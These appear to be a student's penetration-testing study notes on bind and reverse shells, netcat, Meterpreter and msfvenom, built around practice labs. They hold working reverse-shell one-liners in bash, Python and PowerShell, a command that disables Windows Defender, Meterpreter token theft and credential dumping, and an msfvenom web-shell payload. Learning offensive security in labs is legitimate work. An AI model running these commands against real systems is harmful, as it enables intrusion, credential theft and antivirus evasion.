  JPT
#Note taking tools

	Cherrytree	Visual Studio Code	Evernote
	Notion		GitBook			Sublime Text
	Notepad++
#Resources
* Other vulnerable machines/applications
	OWASP Juice Shop	Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire OWASP Top Ten along with many other real-world application security flaws. ==> https://owasp.org/www-project-juice-shop/
	Metasploitable 2	Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation. ==> https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
	Metasploitable 3	Is a template for building a vulnerable Windows VM configured with a wide range of vulnerabilities. ==> https://github.com/rapid7/metasploitable3
	DVWA	This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty. ==> https://github.com/digininja/DVWA

* Youtube Channels
	
	IppSec	Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.
	VbScrub	Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.
	STÖK	Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.
	LiveOverflow	Provides videos on a wide variety of technical infosec topics.
* Blogs
	https://0xdf.gitlab.io/

* Tutorial websites
	https://www.underthewire.tech/index.htm
	https://overthewire.org/wargames/

#Basics VPN
At a high-level, VPN works by routing our connecting device's internet connection through the target VPN's private server instead of our internet service provider (ISP). When connected to a VPN, data originates from the VPN server rather than our computer and will appear to originate from a public IP address other than our own.

There are two main types of remote access VPNs: client-based VPN and SSL VPN. SSL VPN uses the web browser as the VPN client. The connection is established between the browser and an SSL VPN gateway can be configured to only allow access to web-based applications such as email and intranet sites, or even the internal network but without the need for the end user to install or use any specialized software. Client-based VPN requires the use of client software to establish the VPN connection. Once connected, the user's host will work mostly as if it were connected directly to the company network and will be able to access any resources (applications, hosts, subnets, etc.) allowed by the server configuration. Some corporate VPNs will provide employees with full access to the internal corporate network, while others will place users on a specific segment reserved for remote workers.

#Shells
[+] Anatomy of a Shell
  > Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. Here are some of the most common terminal emulators:
  Terminal Emulator	Operating System
  Windows Terminal	Windows
  cmder	            Windows
  PuTTY	            Windows
  kitty	            Windows, Linux and MacOS
  Alacritty	        Windows, Linux and MacOS
  xterm	            Linux
  GNOME Terminal	  Linux
  MATE Terminal	    Linux
  Konsole	          Linux
  Terminal	        MacOS
  iTerm2	          MacOS
  
  > A way we can identify the language interpreter is by viewing the processes running on the machine. In Linux, we can do this using the following command:
    + Shell Validation From 'ps'
      m1l0js@htb[/htb]$ ps
      PID TTY          TIME CMD
      4232 pts/1    00:00:00 bash
      11435 pts/1    00:00:00 ps
  > We can also find out what shell language is in use by viewing the environment variables using the env command:
    + Shell Validation Using 'env'
      m1l0js@htb[/htb]$ env
      SHELL=/bin/bash
  > In powershell
    + Edition of PowerShell
      $PSversiontable 
  > One of the main points we can take away from this is a terminal emulator is not tied to one specific language. Actually, the shell language can be changed and customized to suit the sysadmin, developer, or pentester's personal preference, workflow, and technical needs.


  ASP ==> Windows Servers
  JSP ==> Apache Tomcats
  PHP ==> Classical Apache

  msfvenom --list payloads | grep "linux"
  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

* Netcat Fundamentals
	> Network utility used to read and write data to network connections using TCP or UDP
	[+] Netcat can be used to perform:
  		- Banner Grabbing
  		- Port Scanning
  		- Transferring Files
  		- Bind/Reverse Shells
	[+] nc 
		-v //verbose
	    	-u //udp
	    	-l //listen
	    	-n //nodns
	    	-e //exec 

    	[+] How to transfer nc.exe to a Windows machine
		> certutil 
    			A: ls -la /usr/share/windows-resources/
    	  		A: python3 -m http.server 80
    	  		V: certutil -urlcache -f http://<AttackIP>/nc.exe nc.exe
		> nc
    	  		A: vim test.txt
    	  		V: nc.exe -nvlp 1234 > test.txt
    	  		A: nc -nv VictimMachine 1234 < test.txt
* There's another Windows alternative to netcat coded in PowerShell called PowerCat (https://github.com/besimorhino/powercat)



* Bind Shells
  > With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).
  + There can be many challenges associated with getting a shell this way. Here are some to consider:
    > There would have to be a listener already started on the target.
    > If there is no listener started, we would need to find a way to make this happen.
    > Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
    > Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.
	> Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
  [+] Practicing with GNU Netcat
      + No. 1: Server - Target starting Netcat listener 
        Target@server:~$ nc -lvnp 7777
        Listening on [0.0.0.0] (family 0, port 7777)
    > In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.
    > Back on the client (attack box), we will use nc to connect to the listener we started on the server.
      + No. 2: Client - Attack box connecting to target
    > Notice how we are using nc on the client and the server. On the client-side, we specify the server's IP address and the port that we configured to listen on (7777). Once we successfully connect, we can see a succeeded! message on the client as shown above and a received! message on the server, as seen below.
      + No. 3: Server - Target receiving connection from client
        Target@server:~$ nc -lvnp 7777
        Listening on [0.0.0.0] (family 0, port 7777)
        Connection from 10.10.14.117 51872 received!    
    > Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.
      + No. 4: Client - Attack box sending message Hello Academy
        m1l0js@htb[/htb]$ nc -nv 10.129.41.200 7777
        Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
        Hello Academy  
    > Once we type the message and hit enter, we will notice the message is received on the server-side.
      + No. 5: Server - Target receiving Hello Academy message
        Victim@server:~$ nc -lvnp 7777
        Listening on [0.0.0.0] (family 0, port 7777)
        Connection from 10.10.14.117 51914 received!
        Hello Academy
    ! Note: When on the academy network (10.129.x.x/16) we can work with another academy student to connect to their target box and practice the concepts presented in this module.
  [+] Establishing a Basic Bind Shell with Netcat
    > We have shown that we can use Netcat to send text between the client and the server, but this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat. Let's use Netcat to serve up our shell to establish a real bind shell.
    > On the server-side, we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.
      + No. 1: Server - Binding a Bash shell to the TCP session
        Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
      > The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.
      > Back on the client, use Netcat to connect to the server now that a shell on the server is being served.
        + No. 2: Client - Connecting to bind shell on target
          m1l0js@htb[/htb]$ nc -nv 10.129.41.200 7777
          Target@server:~$  
      > We will notice that we have successfully established a bind shell session with the target. Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical. We worked through these exercises to understand the basics of the bind shell and how it works without any security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc...) in place or exploits needed. This fundamental understanding will be helpful as we get into more challenging situations and realistic scenarios working with vulnerable systems.

      > As mentioned earlier in this section, it is also good to remember that the bind shell is much easier to defend against. Since the connection will be received incoming, it is more likely to get detected and blocked by firewalls even if standard ports are used when starting a listener. There are ways to get around this by using a reverse shell which we will discuss in the next section.
  [+] Other examples of netcat
    > A netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.
    > Example (From Linux to Windows)
    	V: nc -nvlp 1234 -e cmd.exe 
        	A: nc -nv 10.4.21.221 1234

    > Other example (From Windows to Linux)
    	A: nc -nvlp 1234 -c /bin/bash //In Linux
        	V: nc.exe -nv 10.10.3.2 1234
	[+] Bind shell cheatsheet
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md
	[+] Reliable commands
		> Bash
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
		> Python
			python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
		> Powershell
			powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

* Reverse shells
  > With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
  > We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected. The last section discussed how bind shells rely on incoming connections allowed through the firewall on the server-side. It will be much harder to pull this off in a real-world scenario. As seen in the image above, we are starting a listener for a reverse shell on our attack box and using some method (example: Unrestricted File Upload, Command Injection, etc..) to force the target to initiate a connection with our target box, effectively meaning our attack box becomes the server and the target becomes the client.

  > We don't always need to re-invent the wheel when it comes to payloads (commands & code) we intend to use when attempting to establish a reverse shell with a target. There are helpful tools that infosec veterans have put together to assist us. Reverse Shell Cheat Sheet(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement. We should be mindful that many admins are aware of public repositories and open-source resources that penetration testers commonly use. They can reference these repos as part of their core considerations on what to expect from an attack and tune their security controls accordingly. In some cases, we may need to customize our attacks a bit.
  [+] Hands-on With A Simple Reverse Shell in Windows
    > With this walkthrough, we will be establishing a simple reverse shell using some PowerShell code on a Windows target. Let's start the target and begin. As a Metasploit user, we will meet these under the common names reverse_tcp, reverse_https, and bind_tcp.

    > We can start a Netcat listener on our attack box as the target spawns.
      + Server (attack box) 
        m1l0js@htb[/htb]$ sudo nc -lvnp 443
        Listening on 0.0.0.0 443

    > This time around with our listener, we are binding it to a common port (443 ==> https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html), this port usually is for HTTPS connections. We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday. That said, a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port. Detailed firewall evasion is outside of the scope of this module, so we will only briefly touch on detection & evasion techniques throughout the module, as well as in the dedicated section at the end.

    > Once the Windows target has spawned, let's connect using RDP.
    > Netcat can be used to initiate the reverse shell on the Windows side, but we must be mindful of what applications are present on the system already. Netcat is not native to Windows systems, so it may be unreliable to count on using it as our tool on the Windows side. We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start. That said, it's ideal to use whatever tools are native (living off the land) to the target we are trying to gain access to.
    > What applications and shell languages are hosted on the target?
    > This is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt & PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.
    > On the Windows target, open a command prompt and copy & paste this command:
      + Client (target)
        powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

    ! Note: If we are using Pwnbox, keep in mind that some browsers do not work as seamlessly when using the Clipboard feature to paste a command directly into the CLI of a target. In these cases, we may want to paste into Notepad on the target, then copy & paste from inside the target.

    > Please take a close look at the command and consider what we need to change for this to allow us to establish a reverse shell with our attack box. This PowerShell code can also be called shell code or our payload. Delivering this payload onto the Windows system was pretty straightforward, considering we have complete control of the target for demonstration purposes. As this module progresses, we will notice the difficulty increases in how we deliver the payload onto targets.

    > What happened when we hit enter in command prompt?
      + Client (target)
        This script contains malicious content and has been blocked by your ntivirus software.
    > The Windows Defender antivirus (AV) software stopped the execution of the code. This is working exactly as intended, and from a defensive perspective, this is a win. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the Virus & threat protection settings or by using this command in an administrative PowerShell console (right-click, run as admin):
      + Disable AV
        PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
    > Once AV is disabled, attempt to execute the code again.
      + Server (attack box)
        m1l0js@htb[/htb]$ sudo nc -lvnp 443
        Listening on 0.0.0.0 443
        Connection received on 10.129.36.68 49674
        PS C:\Users\htb-student> whoami
        ws01\htb-student
[+] Payloads
! One-Liners Examined
  * Netcat/Bash Reverse Shell One-liner
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
    > The commands above make up a common one-liner issued on a Linux system to serve a Bash shell on a network socket utilizing a Netcat listener. We used this earlier in the Bind Shells section. It's often copied & pasted but not often understood. Let's break down each portion of the one-liner:
      + Remove /tmp/f
        rm -f /tmp/f; 
    > Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially.
      + Make A Named Pipe
        mkfifo /tmp/f;
    > Makes a FIFO named pipe file(https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially.
      + Output Redirection
        cat /tmp/f | 
    > Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).
      + Set Shell Options
        /bin/bash -i 2>&1 | 
    > Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard input data stream (1) are redirected to the command following the pipe (|).
      + Open a Connection with Netcat
        nc 10.10.14.12 7777 > /tmp/f  
    > Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed
  
  * PowerShell One-liner Explained
    > The shells & payloads we choose to use largely depend on which OS we are attacking. Be mindful of this as we continue throughout the module. We witnessed this in the reverse shells section by establishing a reverse shell with a Windows system using PowerShell. Let's breakdown the one-liner we used:
    Powershell One-liner
      powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    > We will dissect the rather large PowerShell command you can see above. It may look like a lot, but hopefully, we can demystify it a bit.
      + Calling PowerShell
        powershell -nop -c 
    > Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in cmd.exe.
      + Binding a socket
        "$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,433);
    > Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the commands & code are executed sequentially.
      + Setting The Command Stream
        $stream = $client.GetStream();
    > Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications. The semi-colon (;) ensures the commands & code are executed sequentially.
      + Empty Byte Stream
        [byte[]]$bytes = 0..65535|%{0}; 
    > Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.
      + Stream Parameters
          while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    > Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read => (https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.
      + Set the Byte Encoding
        {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    > Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (;) ensures the commands & code are executed sequentially.
      + Invoke-Expression
        $sendback = (iex $data 2>&1 | Out-String ); 
    > Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard input (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (;) ensures the commands & code are executed sequentially.
      + Show working Directory
        $sendback2 = $sendback + 'PS ' + (pwd).path + '> ';` 
    > Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (;) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.
      + Sets sendbyte
        $sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
    > Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.
      + Terminate TCP connection
        $client.Close()"
    > This is the TcpClient.Close ==> (https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.
    
    > The one-liner we just examined together can also be executed in the form of a PowerShell script (.ps1). We can see an example of this by viewing the source code below. This source code is part of the nishang (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) project:
    
	> Example(From Linux to Linux)

		nc -nv 10.10.0.2 1234 -e /bin/bash
    	    	nc -nvlp 1234
    	  
    	> Other example(From Windows to Linux)
    		A: nc -nlvp 1234
    	    	V: nc.exe -nv 10.10.0.2 1234 -e cmd.exe

    	> Reverse shell Cheatsheet 
    		https://github.com/swisskyrepo/PayloadsAllTheThings
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
    	    	https://www.revshells.com/
		https://highon.coffee/blog/reverse-shell-cheat-sheet/
	[+] Reliable commands
		> Bash
			bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
		> Powershell
			powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

* Common payloads used for Windows machines
Payload	                        Description
generic/custom	                Generic listener, multi-use
generic/shell_bind_tcp	        Generic listener, multi-use, normal shell, TCP connection binding
generic/shell_reverse_tcp	    Generic listener, multi-use, normal shell, reverse TCP connection
windows/x64/exec	            Executes an arbitrary command (Windows x64)
windows/x64/loadlibrary	        Loads an arbitrary x64 library path
windows/x64/messagebox	        Spawns a dialog via MessageBox using a customizable title, text & icon
windows/x64/shell_reverse_tcp	Normal shell, single payload, reverse TCP connection
windows/x64/shell/reverse_tcp	Normal shell, stager + stage, reverse TCP connection
windows/x64/shell/bind_ipv6_tcp	Normal shell, stager + stage, IPv6 Bind TCP stager
windows/x64/meterpreter/$	    Meterpreter payload + varieties above
windows/x64/powershell/$	    Interactive PowerShell sessions + varieties above
windows/x64/vncinject/$	        VNC Server (Reflective Injection) + varieties above

* Meterpreter
    > The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.

    > It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, etc.

    > For some interesting reading, check out this post(https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/) on Meterpreter stageless payloads and this post(https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/) on modifying Metasploit templates for evasion. These topics are outside the scope of this module, but we should be awarer of these possibilities.

[+] Running Meterpreter

    > To run Meterpreter, we only need to select any version of it from the show payloads output, taking into consideration the type of connection and OS we are attacking.
    > When the exploit is completed, the following events occur:
    
        + The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.
        + The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.
        + The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.
        + Lastly, Meterpreter loads extensions. It will always load stdapi and load priv if the module gives administrative rights. All of these extensions are loaded over AES encryption.
    
    > Whenever the Meterpreter Payload is sent and run on the target system, we receive a Meterpreter shell.

    > meterpreter 
        getuid
        ps
        steal_token 1836 # 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
        getuid #Server username: NT AUTHORITY\NETWORK SERVICE
    > Privesc
        msf6 post(multi/recon/local_exploit_suggester) > show options
        //Running the recon module presents us with a multitude of options. Going through each separate one, we land on the ms15_051_client_copy_image entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.
        msf6 exploit(windows/local/ms15_051_client_copy_image) > show options
        hashdump
        lsa_dump_sam
        lsa_dump_secrets

[+] Writing and importing modules
    > To install any new Metasploit modules which have already been ported over by other users, one can choose to update their msfconsole from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of msfconsole. As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.

    > However, if we need only a specific module and do not want to perform a full upgrade, we can download that module and install it manually. We will focus on searching ExploitDB for readily available Metasploit modules, which we can directly import into our version of msfconsole locally.

    > ExploitDB is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is Metasploit Framework (MSF), which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the msfconsole.

    ! Example
        > Let's say we want to use an exploit found for Nagios3, which will take advantage of a command injection vulnerability. The module we are looking for is Nagios3 - 'statuswml.cgi' Command Injection (Metasploit). So we fire up msfconsole and try to search for that specific exploit, but we cannot find it. This means that our Metasploit framework is not up to date or that the specific Nagios3 exploit module we are looking for is not in the official updated release of the Metasploit Framework.
        > We can, however, find the exploit code inside ExploitDB's entries. Alternatively, if we do not want to use our web browser to search for a specific exploit within ExploitDB, we can use the CLI version, searchsploit.
        > Note that the hosted file terminations that end in .rb are Ruby scripts that most likely have been crafted specifically for use within msfconsole. We can also filter only by .rb file terminations to avoid output from scripts that cannot run within msfconsole. Note that not all .rb files are automatically converted to msfconsole modules. Some exploits are written in Ruby without having any Metasploit module-compatible code in them. We will look at one of these examples in the following sub-section.
            m1l0js@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"
        > We have to download the .rb file and place it in the correct directory. The default directory where all the modules, scripts, plugins, and msfconsole proprietary files are stored is /usr/share/metasploit-framework. The critical folders are also symlinked in our home and root folders in the hidden ~/.msf4/ location.
            m1l0js@htb[/htb]$ ls /usr/share/metasploit-framework/
            m1l0js@htb[/htb]$ ls .msf4/
        > We copy it into the appropriate directory after downloading the exploit. Note that our home folder .msf4 location might not have all the folder structure that the /usr/share/metasploit-framework/ one might have. So, we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find the new modules. After that, we will be proceeding with copying the .rb script directly into the primary location.

        > Please note that there are certain naming conventions that, if not adequately respected, will generate errors when trying to get msfconsole to recognize the new module we installed. Always use snake-case, alphanumeric characters, and underscores instead of dashes.
        
        > MSF - Loading Additional Modules at Runtime
            m1l0js@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
            m1l0js@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
        > MSF - Loading Additional Modules
            msf6> loadpath /usr/share/metasploit-framework/modules/
        > Alternatively, we can also launch msfconsole and run the reload_all command for the newly installed module to appear in the list. After the command is run and no errors are reported, try either the search [name] function inside msfconsole or directly with the use [module-path] to jump straight into the newly installed module.
    ! Other example
        m1l0js@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
        bludit_upload_images_exec.rb
        m1l0js@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
        > At the beginning of the file we copied, which is where we will be filling in our information, we can notice the include statements at the beginning of the boilerplate module. These are the mixins mentioned in the Plugins and Mixins section, and we will need to change these to the appropriate ones for our module. If we want to find the appropriate mixins, classes, and methods required for our module to work, we will need to look up the different entries on the rubydoc rapid7 documentation ==> (https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf)

[+] Writing our module
Function	                        Description
Msf::Exploit::Remote::HttpClient	This module provides methods for acting as an HTTP client when exploiting an HTTP server.
Msf::Exploit::PhpEXE	            This is a method for generating a first-stage php payload.
Msf::Exploit::FileDropper	        This method transfers files and handles file clean-up after a session with the target is established.
Msf::Auxiliary::Report	            This module provides methods for reporting data to the MSF DB.

    > If you would like to learn more about porting scripts into the Metasploit Framework, check out the Metasploit: A Penetration Tester's Guide book(https://nostarch.com/metasploit) from No Starch Press. Rapid7 has also created blog posts on this topic, which can be found here => (https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/)


[+] Introduction to MSFVenom
    > MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.
    > MSFVenom is the result of the marriage between these two tools. Before this tool, we had to pipe (|) the result from MSFPayload, which was used to generate shellcode for a specific processor architecture and OS release, into MSFEncode, which contained multiple encoding schemes used both for removing bad characters from shellcode. This could sometimes cause instability during the runtime - and for evading older Anti-Virus (AV) and endpoint Intrusion Prevention / Intrusion Detection (IPS/IDS) software.
    > Nowadays, the two combined tools offer penetration testers a method to quickly craft payloads for different target host architectures and releases while having the possibility to 'clean up' their shellcode so that it does not run into any errors when deployed. The AV evasion part is much more complicated today, as signature-only-based analysis of malicious files is a thing of the past. Heuristic analysis, machine learning, and deep packet inspection make it much harder for a payload to run through several subsequent iterations of an encoding scheme to evade any good AV software. 

    * Creating our payloads
        > Let's suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a web service running on port tcp/80 of the same machine and that all of the files found in the FTP root directory can be viewed in the web-service's /uploads directory. Let's also suppose that the web service does not have any checks for what we are allowed to run on it as a client.
        > Suppose we are hypothetically allowed to call anything we want from the web service. In that case, we can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing us to receive a reverse TCP connection from the victim machine.
            m1l0js@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
        > Now, we only need to navigate to http://10.10.10.5/reverse_shell.aspx, and it will trigger the .aspx payload. Before we do that, however, we should start a listener on msfconsole so that the reverse connection request gets caught inside it.
            msf6 > use multi/handler
                
